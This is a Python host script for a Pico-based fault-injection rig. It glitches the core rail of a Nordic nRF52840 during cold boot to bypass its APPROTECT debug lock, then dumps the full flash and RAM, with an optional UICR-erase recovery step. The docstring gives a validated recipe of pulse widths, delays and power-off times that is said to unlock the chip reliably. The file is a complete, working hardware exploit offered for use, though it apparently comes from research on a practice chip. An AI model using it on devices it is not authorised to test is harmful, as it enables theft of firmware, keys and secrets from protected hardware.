#!/usr/bin/env python3
"""
nrf_attack.py -- nRF52840 APPROTECT glitch, COLD POWER-CYCLE attack (the working one).

This is the attack that reliably unlocks the part. The Pico powers the target's VDD and
power-cycles it each attempt; the crowbar collapses the DEC1 core rail during the early
COLD boot (DEC1 still ramping/weak) to fault the boot-ROM APPROTECT read. Wiring:
see ../NRF52840_WIRING_POWERCYCLE.md.

VALIDATED RECIPE (cracked the practice chip repeatedly, 2026-06-02):
  WIDTH  225-265 cyc (~1.5-1.77 us)  -- the one-shot locked boot needs a STRONGER pulse
                                        than the RAM-harness 165-180 band; hits cluster 255-265
  DELAY  1065-1170 us after power-on -- app-start ~1271us (slow rail ramp), read precedes it;
                                        a wide blind sweep 1050-1350us lands it
  OFF    18 ms                       -- caps removed -> rail fully discharges -> clean cold boot

Verifies the part is genuinely LOCKED first (a clean power-cycle re-locks it), streams the
firmware's `TARGET GLITCH APPROTECT` 2D sweep, and on a genuine unlock (honest AHB read, not
the unreliable APPROTECTSTATUS bit) dumps the FULL flash + RAM. Auto-detects the Pico port.

Examples:
  ./nrf_attack.py                                  # validated blind sweep (defaults below)
  ./nrf_attack.py --d0 1060 --d1 1175 --w0 255 --w1 265 --tries 100000   # tight, fast
"""
import argparse
from colors import ColorHelpFormatter, hdr, ok, warn, err, info, dim
import glob
import sys
import time

import serial

from nrf_recovery import (parse_hexdump, run_recovery, dump_flash_and_ram,
                          project_path, pretty_info)


def colorize_fw(t):
    """Color a raw firmware sweep line by its content (semantic scheme)."""
    if "UNLOCKED" in t or "SUCCEEDED" in t:
        return ok(t)
    if "did not unlock" in t or "No unlock" in t or "FAIL" in t:
        return warn(t)
    if "DISRUPT" in t:
        return info(t)
    return t


def find_port(req):
    if req:
        return req
    for p in sorted(glob.glob("/dev/ttyACM*")):
        try:
            s = serial.Serial(p, 115200, timeout=1.0); time.sleep(0.3)
            s.reset_input_buffer(); s.write(b"VERSION\r\n")
            # BOUNDED read: a device mid-sweep streams endlessly, so `while in_waiting`
            # would never exit. Read a fixed window and accept any of our firmware's
            # signatures (banner, or sweep/SWD output if a glitch loop is running).
            r = b""; t0 = time.time()
            while time.time() - t0 < 0.6:
                n = s.in_waiting
                if n:
                    r += s.read(n)
                else:
                    time.sleep(0.02)
            s.close()
            if b"Raiden" in r or b"DPIDR" in r or b"[SWD]" in r:
                return p
        except serial.SerialException:
            pass
    raise SystemExit("no Raiden Pico on /dev/ttyACM* (pass --pico-port)")


class Pico:
    def __init__(self, port):
        self.s = serial.Serial(port, 115200, timeout=1.0)
        time.sleep(0.3); self.s.reset_input_buffer()

    def cmd(self, c, wait=0.5):
        self.s.reset_input_buffer()
        self.s.write(c.encode() + b"\r\n"); time.sleep(wait)
        o = b""
        while self.s.in_waiting:
            o += self.s.read(self.s.in_waiting); time.sleep(0.02)
        return o.decode("utf-8", "replace")

    def send(self, c):
        self.s.reset_input_buffer()
        self.s.write(c.encode() + b"\r\n")

    def close(self):
        try:
            self.cmd("ARM OFF", 0.05)
        except Exception:
            pass
        try:
            self.s.close()
        except Exception:
            pass


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=ColorHelpFormatter)
    ap.add_argument("--pico-port", default=None, help="Pico CDC port (default: auto-detect)")
    ap.add_argument("--d0", type=int, default=1050, help="delay sweep start, us after power-on (validated window 1065-1170)")
    ap.add_argument("--d1", type=int, default=1350, help="delay sweep end, us")
    ap.add_argument("--dstep", type=int, default=3, help="delay step, us")
    ap.add_argument("--w0", type=int, default=225, help="width sweep start, cyc (validated 225-265; 6.67ns/cyc)")
    ap.add_argument("--w1", type=int, default=265, help="width sweep end, cyc")
    ap.add_argument("--wstep", type=int, default=2, help="width step, cyc")
    ap.add_argument("--off", type=int, default=18, help="target power-off time per attempt, ms (18 = full rail discharge)")
    ap.add_argument("--settle", type=int, default=4, help="wait after glitch before SWD probe, ms")
    ap.add_argument("--tries", type=int, default=20000, help="total attempts (grid loops to fill)")
    ap.add_argument("--out", default=project_path("nrf_flash_dump.bin"),
                    help="flash dump file on unlock (default: scripts/nrf52840/)")
    ap.add_argument("--max-secs", type=float, default=2400.0, help="host watchdog timeout, s")
    ap.add_argument("--apply-recovery", action="store_true",
                    help="after the dump, EXECUTE the build-code recovery (legacy parts: "
                         "ERASEUICR for a persistent unlock). Default: dry-run print only.")
    a = ap.parse_args()
    try:
        sys.stdout.reconfigure(line_buffering=True)   # live progress in a redirected log
    except Exception:
        pass

    port = find_port(a.pico_port)
    print(info(f"[pico] {port}"))
    p = Pico(port)
    try:
        p.cmd("TARGET NRF52840", 0.4)
        # genuine locked-boot target: power-cycle re-locks; confirm PROTECTED
        p.cmd("ARM OFF", 0.15)
        p.cmd("TARGET POWER OFF", 0.4); time.sleep(0.5)
        p.cmd("TARGET POWER ON", 0.4); time.sleep(0.5)
        st = p.cmd("TARGET NRF STATUS", 0.8)
        locked = "PROTECTED" in st and "UNPROTECTED" not in st
        print((ok if locked else warn)(st.strip()))
        if not locked:
            print(warn("WARN: part is NOT locked (UNPROTECTED). A real test needs the locked "
                       "state -- power-cycle the target and rerun. Continuing anyway..."))

        params = (f"{a.d0} {a.d1} {a.dstep} {a.w0} {a.w1} {a.wstep} "
                  f"{a.off} {a.settle} {a.tries}")
        print(hdr(f">>> TARGET GLITCH APPROTECT {params}"))
        print(info(f"    grid = {((a.d1-a.d0)//max(a.dstep,1)+1)} delays x "
                   f"{((a.w1-a.w0)//max(a.wstep,1)+1)} widths; budget {a.tries} attempts"))
        p.send(f"TARGET GLITCH APPROTECT {params}")

        start = time.time(); buf = b""; unlocked = False; n_disrupt = 0
        last_progress = time.time(); n_swd = 0
        while time.time() - start < a.max_secs:
            n = p.s.in_waiting
            if n:
                buf += p.s.read(n)
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    t = line.decode("utf-8", "replace").rstrip()
                    if not t:
                        continue
                    # The firmware reconnects SWD every attempt and prints an
                    # identical "[SWD] Connected, DPIDR=..." each time. It carries
                    # no per-attempt signal (DPIDR is constant), so print it once
                    # and silently count the rest to keep the sweep log readable.
                    if "Connected, DPIDR" in t:
                        n_swd += 1
                        if n_swd == 1:
                            print(dim(t))
                        continue
                    print(colorize_fw(t))
                    if "DISRUPT" in t:
                        n_disrupt += 1
                    if "UNLOCKED" in t:
                        unlocked = True
                    # done markers -- NOT "APPROTECT glitch" alone: that substring also
                    # appears in the sweep's header line and would bail us out instantly.
                    if ("did not unlock" in t or "No unlock" in t
                            or "SUCCEEDED" in t):
                        raise StopIteration
                last_progress = time.time()
            else:
                time.sleep(0.05)
                if time.time() - last_progress > 90:
                    print(dim(f"[host] ...still running, {int(time.time()-start)}s elapsed, "
                              f"{n_disrupt} disrupts, {n_swd} SWD reconnects seen"))
                    last_progress = time.time()
    except StopIteration:
        pass
    except KeyboardInterrupt:
        print(warn("\n[host] interrupted -- the firmware sweep may still be running; "
                   "power-cycle the Pico to abort."))
    finally:
        if 'unlocked' in dir() and unlocked:
            print(ok("\n*** UNLOCKED -- reading flash + RAM ***"))
            print(pretty_info(p.cmd("TARGET NRF INFO", 1.2)))
            fn, rn, ram_out = dump_flash_and_ram(p, a.out)
            print(ok(f"saved flash {fn} bytes -> {a.out}"))
            print(ok(f"saved RAM {rn} bytes -> {ram_out}") if rn
                  else err("WARN: RAM dump 0 bytes"))
            if not fn:
                print(err("WARN: flash dump produced 0 bytes (part re-locked before the read?)"))
            # build-code-branched recovery (dry-run unless --apply-recovery)
            try:
                run_recovery(p, apply=a.apply_recovery)
            except Exception as e:
                print(warn(f"[recovery] skipped: {e}"))
        p.close()


if __name__ == "__main__":
    main()
